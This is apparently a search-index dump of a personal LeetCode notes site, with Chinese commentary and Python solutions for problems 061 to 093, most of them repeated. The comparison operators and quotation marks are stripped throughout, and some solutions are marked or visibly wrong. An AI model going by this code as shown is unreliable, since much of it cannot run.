rotate 2 steps to the right: 4- 5- 1- 2- 3- NULL Input: 0- 1- 2- NULL, k = 4 Output: 2- 0- 1- NULL Explanation: rotate 1 steps to the right: 2- 0- 1- NULL rotate 2 steps to the right: 1- 2- 0- NULL rotate 3 steps to the right: 0- 1- 2- NULL rotate 4 steps to the right: 2- 0- 1- NULL \u60f3\u6cd5 \u8fde\u6210\u4e00\u4e2a\u73af\uff0c\u63a5\u7740\u904d\u5386 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def rotateRight ( self , head : ListNode , k : int ) - ListNode : if head == None : return None count = 0 tmp = head while tmp : tmp = tmp . next count += 1 # print(count) p , linkedNode = head , head for _ in range ( k % count ): linkedNode = linkedNode . next while p . next and linkedNode . next : p = p . next linkedNode = linkedNode . next linkedNode . next = head res = p . next p . next = None return res 062 \u72ec\u7279\u8def\u5f84\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u673a\u5668\u4eba\u548c\u4e00\u4e2am*n\u7684\u683c\u5b50\u677f\uff0c\u673a\u5668\u4eba\u667a\u80fd\u5411\u4e0b\u6216\u8005\u5411\u53f3\u79fb\u52a8\uff0c\u4ece\u5de6\u4e0a\u5230\u53f3\u4e0b\uff0c\u6709\u591a\u5c11\u4e0d\u4e00\u6837\u7684\u8def\u5f84 \u60f3\u6cd5 \u611f\u89c9\u7c7b\u4f3cDP\uff0c\u9012\u5f52\u611f\u89c9\u4e5f\u884c \u5982\u679c\u662fDP\u7684\u8bdd: DP[i][j]\u4e3aDP[i-1][j]+dp[i][j-1]+dp[i-1][j-1]+2 \u591a\u8003\u8651\u4e86dp[i-1][j-1]\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u4ecedp[i-1][j-1]\u5230\u662f\u53ef\u4ee5\u5230dp[i-1][j]\u6216dp[i][j-1]\u7684\uff0c\u91cd\u590d\u8003\u8651 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 class Solution : def uniquePaths ( self , m : int , n : int ) - int : dp = [[ 0 for _ in range ( n )] for _ in range ( m )] for i in range ( m ): dp [ i ][ 0 ] = 1 for j in range ( n ): dp [ 0 ][ j ] = 1 for i in range ( 1 , m ): for j in range ( 1 , n ): dp [ i ][ j ] = dp [ i - 1 ][ j ] + dp [ i ][ j - 1 ] #+ dp[i - 1][j - 1] + 2 return dp [ - 1 ][ - 1 ] 066 \u7ed9\u5b9a\u4e00\u4e2a\u975e\u7a7a\u7684\u6570\u7ec4\uff0c\u7136\u540e\u6700\u540e\u4e00\u4e2a\u6570\u52a0\u4e00\uff1f \u6bcf\u4e2adigits[i]\u53ea\u80fd\u75310-9\u7ec4\u6210 1 2 input: 9 ouput: 1,0 \u6cd5\u4e00 \u66b4\u529b\u4e4b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def plusOne ( self , digits ): :type digits: List[int] :rtype: List[int] res = [] num = 0 carry = 1 for digit in digits [:: - 1 ]: num += digit * carry carry *= 10 num += 1 while num : res . append ( num % 10 ) num //= 10 return res [:: - 1 ] \u6cd5\u4e8c \u904d\u5386\u6570\u7ec4\uff0c\u9047\u52309\u8fdb\u4f4d\uff0c\u5982\u679c\u8fdb\u4f4d\u540e\u4e0d\u80fd\u6ee1\u8db3\u589e\u52a0\u4e00\u4e2a1\uff0c\u5426\u5219\u5bf9\u8fdb\u4f4d\u540e\u7684\u7684\u6570\u5b57\u52a0\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def plusOne ( self , digits ): :type digits: List[int] :rtype: List[int] i = len ( digits ) - 1 while digits [ i ] == 9 : digits [ i ] = 0 i -= 1 if i 0 : digits . insert ( 0 , 1 ) return digits digits [ i ] += 1 return digits 067 \u7ed9\u5b9a\u4e24\u4e2a\u7531\u5b57\u7b26 0 \uff0c 1 \u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u8fd9\u4e24\u4e2a\u7684\u5b57\u7b26\u4e32\u6240\u4ee3\u8868\u7684\u6570\u5b57\u7684\u548c \u4e8c\u8fdb\u5236\u52a0 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class Solution : def addBinary ( self , a , b ): :type a: str :type b: str :rtype: str if len ( b ) len ( a ): return self . addBinary ( b , a ) a = list ( map ( lambda x : int ( x ), a )) b = list ( map ( lambda x : int ( x ), b )) i = 0 carry = 0 res = [] while i len ( a ): if i = len ( b ): cb = 0 else : cb = b [ len ( b ) - i - 1 ] sum = a [ len ( a ) - i - 1 ] + cb + carry if sum 1 : res . append ( str ( sum % 2 )) carry = sum // 2 else : res . append ( str ( sum )) carry = 0 i += 1 if carry != 0 : res . append ( 1 ) return . join ( res [:: - 1 ]) \u6cd5\u4e8c \u9012\u5f52 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution ( object ): def addBinary ( self , a , b , carried = 0 ): if ( not a ) or ( not b ): return str ( carried ) if carried else elif ( not a ): a = 0 elif ( not b ): b = 0 summed = int ( b [ - 1 ]) + int ( a [ - 1 ]) + carried carried = summed / 2 bit = summed % 2 return self . addBinary ( a [: - 1 ], b [: - 1 ], carried ) + str ( bit ) 069 \u9762\u8bd5\u7ecf\u5178\u9898 \u5b9e\u73b0 sqrt \u65b9\u6cd5 \u60f3\u6cd5 \u4e8c\u5206 \u725b\u987f\u6cd5 \u542c\u8bf4\u7684\uff0c\u4f46\u662f\u5177\u4f53\u600e\u6837\u8fd8\u662f\u4e0d\u4f1a\u3002\u3002\u3002 \u90a3\u4e48\u9996\u5148\u8bd5\u8bd5\u4e8c\u5206\u6cd5 \u6ce8\u610f\u8fb9\u754c\u6761\u4ef6 \u6cd5\u4e00 \u53cd\u6b63\u66b4\u529b\u5c31\u662f\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def mySqrt ( self , x ): :type x: int :rtype: int left = 0 right = x while right left : middle = left + ( right - left ) // 2 if middle * middle == x : return middle elif middle * middle x : left = middle + 1 else : right = middle - 1 if right * right == x : return right elif left * left x : return left - 1 else : return left \u6cd5\u4e8c 1 2 3 4 5 6 7 8 9 10 class Solution : def mySqrt ( self , x ): :type x: int :rtype: int r = x while r * r x : r = ( r + x / r ) / 2 return r 1 2 3 4 5 6 7 8 9 10 11 class Solution : def mySqrt ( self , x ): l , r = 0 , x while l = r : mid = l + ( r - l ) // 2 #\u6ce8\u610f if mid * mid = x ( mid + 1 ) * ( mid + 1 ): return mid elif x mid * mid : r = mid #\u6ce8\u610f else : l = mid + 1 070 \u722c\u68af\u5b50\uff0c\u7ecf\u5178\u7684\u9762\u8bd5\u9898 \u7ed9\u5b9a\u4e00\u4e2an\u7684\u53f0\u9636\uff0c\u6bcf\u6b21\u722c1\u4e2a\u62162\u4e2a\u53f0\u9636\uff0c\u603b\u5171\u8ba1\u7b97\u591a\u5c11\u79cd\u65b9\u5f0f \u60f3\u6cd5 \u9012\u5f52 \u627e\u89c4\u5f8b \u9996\u5148\u662f\u9012\u5f52\uff0c\u5bf9\u4e8e\u4e00\u4e2an\u7684\u53f0\u9636\uff0c\u53ef\u4ee5\u7531n-1\u53f0\u9636\u722c\u4e00\u4e2a\u68af\u5b50\uff0c\u4e0en-2\u4e2a\u53f0\u9636\u722c\u4e24\u4e2a\u68af\u5b50 \u56e0\u6b64f(n)=f(n-1)+f(n-2) \u7136\u540e\u4f7f\u7528\u9012\u5f52\u5c31\u8d85\u65f6\u4e86 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def climbStairs ( self , n ): :type n: int :rtype: int if n == 1 : return 1 elif n == 2 : return 2 else : one_step_before = 1 two_step_before = 2 res = 0 for _ in range ( n - 2 ): res = one_step_before + two_step_before one_step_before = two_step_before two_step_before = res return res","title":"061 070"},{"location":"LeetCode/vol 0/061-070/#061","text":"\u770b\u6837\u5b50\u662f\u7ed9\u5b9a\u4e00\u4e2a\u94fe\u8868\uff0c\u4ece\u5012\u6570\u7b2ck\u4e2a\u8282\u70b9\u540e\u7ffb\u8f6c 1 2 3 4 5 6 7 8 9 10 11 12 13 Input: 1- 2- 3- 4- 5- NULL, k = 2 Output: 4- 5- 1- 2- 3- NULL Explanation: rotate 1 steps to the right: 5- 1- 2- 3- 4- NULL rotate 2 steps to the right: 4- 5- 1- 2- 3- NULL Input: 0- 1- 2- NULL, k = 4 Output: 2- 0- 1- NULL Explanation: rotate 1 steps to the right: 2- 0- 1- NULL rotate 2 steps to the right: 1- 2- 0- NULL rotate 3 steps to the right: 0- 1- 2- NULL rotate 4 steps to the right: 2- 0- 1- NULL \u60f3\u6cd5 \u8fde\u6210\u4e00\u4e2a\u73af\uff0c\u63a5\u7740\u904d\u5386","title":"061"},{"location":"LeetCode/vol 0/061-070/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def rotateRight ( self , head : ListNode , k : int ) - ListNode : if head == None : return None count = 0 tmp = head while tmp : tmp = tmp . next count += 1 # print(count) p , linkedNode = head , head for _ in range ( k % count ): linkedNode = linkedNode . next while p . next and linkedNode . next : p = p . next linkedNode = linkedNode . next linkedNode . next = head res = p . next p . next = None return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/061-070/#062","text":"\u72ec\u7279\u8def\u5f84\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u673a\u5668\u4eba\u548c\u4e00\u4e2am*n\u7684\u683c\u5b50\u677f\uff0c\u673a\u5668\u4eba\u667a\u80fd\u5411\u4e0b\u6216\u8005\u5411\u53f3\u79fb\u52a8\uff0c\u4ece\u5de6\u4e0a\u5230\u53f3\u4e0b\uff0c\u6709\u591a\u5c11\u4e0d\u4e00\u6837\u7684\u8def\u5f84 \u60f3\u6cd5 \u611f\u89c9\u7c7b\u4f3cDP\uff0c\u9012\u5f52\u611f\u89c9\u4e5f\u884c \u5982\u679c\u662fDP\u7684\u8bdd: DP[i][j]\u4e3aDP[i-1][j]+dp[i][j-1]+dp[i-1][j-1]+2 \u591a\u8003\u8651\u4e86dp[i-1][j-1]\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u4ecedp[i-1][j-1]\u5230\u662f\u53ef\u4ee5\u5230dp[i-1][j]\u6216dp[i][j-1]\u7684\uff0c\u91cd\u590d\u8003\u8651","title":"062"},{"location":"LeetCode/vol 0/061-070/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 class Solution : def uniquePaths ( self , m : int , n : int ) - int : dp = [[ 0 for _ in range ( n )] for _ in range ( m )] for i in range ( m ): dp [ i ][ 0 ] = 1 for j in range ( n ): dp [ 0 ][ j ] = 1 for i in range ( 1 , m ): for j in range ( 1 , n ): dp [ i ][ j ] = dp [ i - 1 ][ j ] + dp [ i ][ j - 1 ] #+ dp[i - 1][j - 1] + 2 return dp [ - 1 ][ - 1 ]","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/061-070/#066","text":"\u7ed9\u5b9a\u4e00\u4e2a\u975e\u7a7a\u7684\u6570\u7ec4\uff0c\u7136\u540e\u6700\u540e\u4e00\u4e2a\u6570\u52a0\u4e00\uff1f \u6bcf\u4e2adigits[i]\u53ea\u80fd\u75310-9\u7ec4\u6210 1 2 input: 9 ouput: 1,0","title":"066"},{"location":"LeetCode/vol 0/061-070/#_3","text":"\u66b4\u529b\u4e4b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def plusOne ( self , digits ): :type digits: List[int] :rtype: List[int] res = [] num = 0 carry = 1 for digit in digits [:: - 1 ]: num += digit * carry carry *= 10 num += 1 while num : res . append ( num % 10 ) num //= 10 return res [:: - 1 ]","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/061-070/#_4","text":"\u904d\u5386\u6570\u7ec4\uff0c\u9047\u52309\u8fdb\u4f4d\uff0c\u5982\u679c\u8fdb\u4f4d\u540e\u4e0d\u80fd\u6ee1\u8db3\u589e\u52a0\u4e00\u4e2a1\uff0c\u5426\u5219\u5bf9\u8fdb\u4f4d\u540e\u7684\u7684\u6570\u5b57\u52a0\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def plusOne ( self , digits ): :type digits: List[int] :rtype: List[int] i = len ( digits ) - 1 while digits [ i ] == 9 : digits [ i ] = 0 i -= 1 if i 0 : digits . insert ( 0 , 1 ) return digits digits [ i ] += 1 return digits","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 0/061-070/#067","text":"\u7ed9\u5b9a\u4e24\u4e2a\u7531\u5b57\u7b26 0 \uff0c 1 \u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u8fd9\u4e24\u4e2a\u7684\u5b57\u7b26\u4e32\u6240\u4ee3\u8868\u7684\u6570\u5b57\u7684\u548c \u4e8c\u8fdb\u5236\u52a0","title":"067"},{"location":"LeetCode/vol 0/061-070/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class Solution : def addBinary ( self , a , b ): :type a: str :type b: str :rtype: str if len ( b ) len ( a ): return self . addBinary ( b , a ) a = list ( map ( lambda x : int ( x ), a )) b = list ( map ( lambda x : int ( x ), b )) i = 0 carry = 0 res = [] while i len ( a ): if i = len ( b ): cb = 0 else : cb = b [ len ( b ) - i - 1 ] sum = a [ len ( a ) - i - 1 ] + cb + carry if sum 1 : res . append ( str ( sum % 2 )) carry = sum // 2 else : res . append ( str ( sum )) carry = 0 i += 1 if carry != 0 : res . append ( 1 ) return . join ( res [:: - 1 ])","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/061-070/#_6","text":"\u9012\u5f52 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution ( object ): def addBinary ( self , a , b , carried = 0 ): if ( not a ) or ( not b ): return str ( carried ) if carried else elif ( not a ): a = 0 elif ( not b ): b = 0 summed = int ( b [ - 1 ]) + int ( a [ - 1 ]) + carried carried = summed / 2 bit = summed % 2 return self . addBinary ( a [: - 1 ], b [: - 1 ], carried ) + str ( bit )","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 0/061-070/#069","text":"\u9762\u8bd5\u7ecf\u5178\u9898 \u5b9e\u73b0 sqrt \u65b9\u6cd5 \u60f3\u6cd5 \u4e8c\u5206 \u725b\u987f\u6cd5 \u542c\u8bf4\u7684\uff0c\u4f46\u662f\u5177\u4f53\u600e\u6837\u8fd8\u662f\u4e0d\u4f1a\u3002\u3002\u3002 \u90a3\u4e48\u9996\u5148\u8bd5\u8bd5\u4e8c\u5206\u6cd5 \u6ce8\u610f\u8fb9\u754c\u6761\u4ef6","title":"069"},{"location":"LeetCode/vol 0/061-070/#_7","text":"\u53cd\u6b63\u66b4\u529b\u5c31\u662f\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def mySqrt ( self , x ): :type x: int :rtype: int left = 0 right = x while right left : middle = left + ( right - left ) // 2 if middle * middle == x : return middle elif middle * middle x : left = middle + 1 else : right = middle - 1 if right * right == x : return right elif left * left x : return left - 1 else : return left","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/061-070/#_8","text":"1 2 3 4 5 6 7 8 9 10 class Solution : def mySqrt ( self , x ): :type x: int :rtype: int r = x while r * r x : r = ( r + x / r ) / 2 return r 1 2 3 4 5 6 7 8 9 10 11 class Solution : def mySqrt ( self , x ): l , r = 0 , x while l = r : mid = l + ( r - l ) // 2 #\u6ce8\u610f if mid * mid = x ( mid + 1 ) * ( mid + 1 ): return mid elif x mid * mid : r = mid #\u6ce8\u610f else : l = mid + 1","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 0/061-070/#070","text":"\u722c\u68af\u5b50\uff0c\u7ecf\u5178\u7684\u9762\u8bd5\u9898 \u7ed9\u5b9a\u4e00\u4e2an\u7684\u53f0\u9636\uff0c\u6bcf\u6b21\u722c1\u4e2a\u62162\u4e2a\u53f0\u9636\uff0c\u603b\u5171\u8ba1\u7b97\u591a\u5c11\u79cd\u65b9\u5f0f \u60f3\u6cd5 \u9012\u5f52 \u627e\u89c4\u5f8b \u9996\u5148\u662f\u9012\u5f52\uff0c\u5bf9\u4e8e\u4e00\u4e2an\u7684\u53f0\u9636\uff0c\u53ef\u4ee5\u7531n-1\u53f0\u9636\u722c\u4e00\u4e2a\u68af\u5b50\uff0c\u4e0en-2\u4e2a\u53f0\u9636\u722c\u4e24\u4e2a\u68af\u5b50 \u56e0\u6b64f(n)=f(n-1)+f(n-2) \u7136\u540e\u4f7f\u7528\u9012\u5f52\u5c31\u8d85\u65f6\u4e86","title":"070"},{"location":"LeetCode/vol 0/061-070/#_9","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def climbStairs ( self , n ): :type n: int :rtype: int if n == 1 : return 1 elif n == 2 : return 2 else : one_step_before = 1 two_step_before = 2 res = 0 for _ in range ( n - 2 ): res = one_step_before + two_step_before one_step_before = two_step_before two_step_before = res return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/071-080/","text":"071 \u7ed9\u5b9a\u4e00\u4e2a\u7c7bUnix\u7684\u8def\u5f84\u683c\u5f0f\uff0c\u89c4\u8303\u8be5\u8def\u5f84 1 2 3 4 5 6 7 8 9 10 11 Input: /home/ Output: /home Explanation: Note that there is no trailing slash after the last directory name. Input: /../ Output: / Explanation: Going one level up from the root directory is a no-op, as the root level is the highest level you can go. Input: /home//foo/ Output: /home/foo Explanation: In the canonical path, multiple consecutive slashes are replaced by a single one. \u60f3\u6cd5 \u770b\u6837\u5b50\u662f\u7528\u6808\u6765\u5b9e\u73b0\uff1f \u4e0d\u8fc7\u770b\u6837\u5b50\u66b4\u529b\u7684\u65b9\u5f0f\u66f4\u597d \u6cd5\u4e00 \u6000\u7591\u81ea\u5df1\u662f\u5426\u601d\u8def\u9519\u8bef\uff0c\u7ed3\u679c\u53d1\u73b0\u601d\u8def\u6b63\u786e\uff0c\u4f46\u662f\u9519\u8bef\u5728\u9898\u76ee\u7684\u7406\u89e3\u4e0a 1 2 3 4 5 6 7 8 9 10 11 class Solution ( object ): def simplifyPath ( self , path ): places = [ p for p in path . split ( / ) if p != . and p != ] stack = [] for p in places : if p == .. : if len ( stack ) 0 : stack . pop () else : stack . append ( p ) return / + / . join ( stack ) \u9519\u8bef 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def simplifyPath ( self , path : str ) - str : pathList = path . split ( / ) if pathList [ - 1 ] == / : pathList . pop ( - 1 ) index = 0 while index len ( pathList ): if pathList [ index ] == . or pathList [ index ] == : pathList . pop ( index ) elif pathList [ index ] == / and pathList [ index + 1 ] == / : pathList . pop ( index ) elif pathList [ index ] == .. : pathList . pop ( index ) if index != 0 : pathList . pop ( index - 1 ) index -= 1 else : # \u8fd9\u91cc\u51fa\u9519\u4e86\uff0c\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u56de\uff0c\u601d\u8def\u4e0d\u6e05\u6670\u6240\u4ee5\u51fa\u9519 return / else : index += 1 return / + / . join ( pathList )","title":"071 080"},{"location":"LeetCode/vol 0/071-080/#071","text":"\u7ed9\u5b9a\u4e00\u4e2a\u7c7bUnix\u7684\u8def\u5f84\u683c\u5f0f\uff0c\u89c4\u8303\u8be5\u8def\u5f84 1 2 3 4 5 6 7 8 9 10 11 Input: /home/ Output: /home Explanation: Note that there is no trailing slash after the last directory name. Input: /../ Output: / Explanation: Going one level up from the root directory is a no-op, as the root level is the highest level you can go. Input: /home//foo/ Output: /home/foo Explanation: In the canonical path, multiple consecutive slashes are replaced by a single one. \u60f3\u6cd5 \u770b\u6837\u5b50\u662f\u7528\u6808\u6765\u5b9e\u73b0\uff1f \u4e0d\u8fc7\u770b\u6837\u5b50\u66b4\u529b\u7684\u65b9\u5f0f\u66f4\u597d","title":"071"},{"location":"LeetCode/vol 0/071-080/#_1","text":"\u6000\u7591\u81ea\u5df1\u662f\u5426\u601d\u8def\u9519\u8bef\uff0c\u7ed3\u679c\u53d1\u73b0\u601d\u8def\u6b63\u786e\uff0c\u4f46\u662f\u9519\u8bef\u5728\u9898\u76ee\u7684\u7406\u89e3\u4e0a 1 2 3 4 5 6 7 8 9 10 11 class Solution ( object ): def simplifyPath ( self , path ): places = [ p for p in path . split ( / ) if p != . and p != ] stack = [] for p in places : if p == .. : if len ( stack ) 0 : stack . pop () else : stack . append ( p ) return / + / . join ( stack )","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/071-080/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def simplifyPath ( self , path : str ) - str : pathList = path . split ( / ) if pathList [ - 1 ] == / : pathList . pop ( - 1 ) index = 0 while index len ( pathList ): if pathList [ index ] == . or pathList [ index ] == : pathList . pop ( index ) elif pathList [ index ] == / and pathList [ index + 1 ] == / : pathList . pop ( index ) elif pathList [ index ] == .. : pathList . pop ( index ) if index != 0 : pathList . pop ( index - 1 ) index -= 1 else : # \u8fd9\u91cc\u51fa\u9519\u4e86\uff0c\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u56de\uff0c\u601d\u8def\u4e0d\u6e05\u6670\u6240\u4ee5\u51fa\u9519 return / else : index += 1 return / + / . join ( pathList )","title":"\u9519\u8bef"},{"location":"LeetCode/vol 0/081-090/","text":"082 \u57fa\u7840\u9898 \u53bb\u9664\u94fe\u8868\u4e2d\u91cd\u590d\u7684\u503c 1 2 3 4 5 6 7 8 9 Example 1: Input: 1- 2- 3- 3- 4- 4- 5 Output: 1- 2- 5 Example 2: Input: 1- 1- 1- 2- 3 Output: 2- 3 \u60f3\u6cd5 \u6ca1\u4ec0\u4e48\u60f3\u6cd5\u76f4\u63a5\u4e0a \u4e00\u4e2a\u5934\u8282\u70b9HEAD\uff0c\u7528\u4e8e\u8fd4\u56de \u4e00\u4e2a\u6307\u9488\u7528\u6765\u63a2\u8def \u4e00\u4e2a\u6307\u9488\u7528\u6765\u6784\u5efa \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # Definition for singly-linked list. # class ListNode: # def __init__(self, x): # self.val = x # self.next = None class Solution : def deleteDuplicates ( self , head : ListNode ) - ListNode : # \u7279\u6b8a\u503c if not head or not head . next : return head # \u521d\u59cb\u5316 HEAD = ListNode ( HEAD ) HEAD . next = head p = head head = HEAD while p and p . next : if p . next . val == p . val : while p . next and p . next . val == p . val : p = p . next p = p . next head . next = p else : p = p . next head = head . next return HEAD . next 083 \u5728\u6392\u5e8f\u94fe\u8868\u4e2d\u5220\u9664\u91cd\u590d\u7684\u5143\u7d20 \u60f3\u6cd5 \u6ca1\u60f3\u6cd5\uff0c\u66b4\u529b \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def deleteDuplicates ( self , head ): :type head: ListNode :rtype: ListNode HEAD = ListNode ( HEAD ) HEAD . next = head p = HEAD . next while p : if p . next and p . val != p . next . val : p = p . next else : if p . next : p . next = p . next . next else : p . next = None break return HEAD . next 088 \u5408\u5e76\u6709\u5e8f\u6570\u7ec4\uff0c\u5c06nums2\u5408\u5e76\u5230nums1\u91cc\uff0c\u8fd9\u91ccnums1\u6709\u8db3\u591f\u591a\u7684\u7684\u7a7a\u95f4 \u60f3\u6cd5 \u5148\u5b9e\u73b0\u4e2a\u66b4\u529b\u7684\u7b97\u6cd5 \u9996\u5148\u9010\u4e2a\u5bf9\u6bd4\u4e24\u4e2a\u6570\u7ec4\u7684\u6570\u503c\uff0c\u5206\u4e3a\u4e09\u79cd\u60c5\u51b5\uff1a nums1[i] =nums2[j] \u90a3\u4e48\u76f4\u63a5\u5728nums\u7b2ci\u5904\u63d2\u5165nums[j]\uff0ci+=1,j+=1 (\u6ce8\u610f\uff0c\u8fd9\u91cc\u4e4b\u524d\u60f3\u7684\u662fi+=2\uff0c\u6ca1\u8003\u8651\u5230\u63d2\u5165\u4e4b\u524dnums[j+1]\u8fd8\u662f\u6bd4nums[i]\u5c0f\u7684\u60c5\u5f62) nums1[i] nums2[j]\uff0c\u90a3\u4e48\u5411\u540e\u5bfb\u627e\uff0ci+=1 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Solution : def merge ( self , nums1 , m : int , nums2 , n : int ) - None : Do not return anything, modify nums1 in-place instead. i = 0 j = 0 sumCount = m + n while i m and j n : if nums1 [ i ] = nums2 [ j ]: self . insertNums ( nums1 , i , nums2 [ j ]) i += 1 j += 1 m += 1 else : i += 1 if i sumCount and n 0 and j n : for index in range ( i , sumCount ): nums1 [ index ] = nums2 [ j ] j += 1 def insertNums ( self , nums , index , val ): for j in range ( len ( nums ) - 1 , index , - 1 ): nums [ j ] = nums [ j - 1 ] nums [ index ] = val","title":"081 090"},{"location":"LeetCode/vol 0/081-090/#082","text":"\u57fa\u7840\u9898 \u53bb\u9664\u94fe\u8868\u4e2d\u91cd\u590d\u7684\u503c 1 2 3 4 5 6 7 8 9 Example 1: Input: 1- 2- 3- 3- 4- 4- 5 Output: 1- 2- 5 Example 2: Input: 1- 1- 1- 2- 3 Output: 2- 3 \u60f3\u6cd5 \u6ca1\u4ec0\u4e48\u60f3\u6cd5\u76f4\u63a5\u4e0a \u4e00\u4e2a\u5934\u8282\u70b9HEAD\uff0c\u7528\u4e8e\u8fd4\u56de \u4e00\u4e2a\u6307\u9488\u7528\u6765\u63a2\u8def \u4e00\u4e2a\u6307\u9488\u7528\u6765\u6784\u5efa","title":"082"},{"location":"LeetCode/vol 0/081-090/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # Definition for singly-linked list. # class ListNode: # def __init__(self, x): # self.val = x # self.next = None class Solution : def deleteDuplicates ( self , head : ListNode ) - ListNode : # \u7279\u6b8a\u503c if not head or not head . next : return head # \u521d\u59cb\u5316 HEAD = ListNode ( HEAD ) HEAD . next = head p = head head = HEAD while p and p . next : if p . next . val == p . val : while p . next and p . next . val == p . val : p = p . next p = p . next head . next = p else : p = p . next head = head . next return HEAD . next","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/081-090/#083","text":"\u5728\u6392\u5e8f\u94fe\u8868\u4e2d\u5220\u9664\u91cd\u590d\u7684\u5143\u7d20 \u60f3\u6cd5 \u6ca1\u60f3\u6cd5\uff0c\u66b4\u529b","title":"083"},{"location":"LeetCode/vol 0/081-090/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def deleteDuplicates ( self , head ): :type head: ListNode :rtype: ListNode HEAD = ListNode ( HEAD ) HEAD . next = head p = HEAD . next while p : if p . next and p . val != p . next . val : p = p . next else : if p . next : p . next = p . next . next else : p . next = None break return HEAD . next","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/081-090/#088","text":"\u5408\u5e76\u6709\u5e8f\u6570\u7ec4\uff0c\u5c06nums2\u5408\u5e76\u5230nums1\u91cc\uff0c\u8fd9\u91ccnums1\u6709\u8db3\u591f\u591a\u7684\u7684\u7a7a\u95f4 \u60f3\u6cd5 \u5148\u5b9e\u73b0\u4e2a\u66b4\u529b\u7684\u7b97\u6cd5 \u9996\u5148\u9010\u4e2a\u5bf9\u6bd4\u4e24\u4e2a\u6570\u7ec4\u7684\u6570\u503c\uff0c\u5206\u4e3a\u4e09\u79cd\u60c5\u51b5\uff1a nums1[i] =nums2[j] \u90a3\u4e48\u76f4\u63a5\u5728nums\u7b2ci\u5904\u63d2\u5165nums[j]\uff0ci+=1,j+=1 (\u6ce8\u610f\uff0c\u8fd9\u91cc\u4e4b\u524d\u60f3\u7684\u662fi+=2\uff0c\u6ca1\u8003\u8651\u5230\u63d2\u5165\u4e4b\u524dnums[j+1]\u8fd8\u662f\u6bd4nums[i]\u5c0f\u7684\u60c5\u5f62) nums1[i] nums2[j]\uff0c\u90a3\u4e48\u5411\u540e\u5bfb\u627e\uff0ci+=1","title":"088"},{"location":"LeetCode/vol 0/081-090/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Solution : def merge ( self , nums1 , m : int , nums2 , n : int ) - None : Do not return anything, modify nums1 in-place instead. i = 0 j = 0 sumCount = m + n while i m and j n : if nums1 [ i ] = nums2 [ j ]: self . insertNums ( nums1 , i , nums2 [ j ]) i += 1 j += 1 m += 1 else : i += 1 if i sumCount and n 0 and j n : for index in range ( i , sumCount ): nums1 [ index ] = nums2 [ j ] j += 1 def insertNums ( self , nums , index , val ): for j in range ( len ( nums ) - 1 , index , - 1 ): nums [ j ] = nums [ j - 1 ] nums [ index ] = val","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/091-100/","text":"093 Todo \u7ed9\u5b9a\u4ec5\u5305\u542b\u6570\u5b57\u7684\u5b57\u7b26\u4e32\uff0c\u901a\u8fc7\u8fd4\u56de\u6240\u6709\u53ef\u80fd\u7684\u6709\u6548IP\u5730\u5740\u7ec4\u5408\u6765\u5b58\u50a8\u3002 1 2 Input: 25525511135 Output: [ 255.255.11.135 , 255.255.111.35 ] \u60f3\u6cd5 \u91cd\u70b9\u662f\u6570\u7684\u5224\u522b \u6700\u591a\u662f255 \u83ab\u975e\u662f\u3002\u3002\u3002DP? 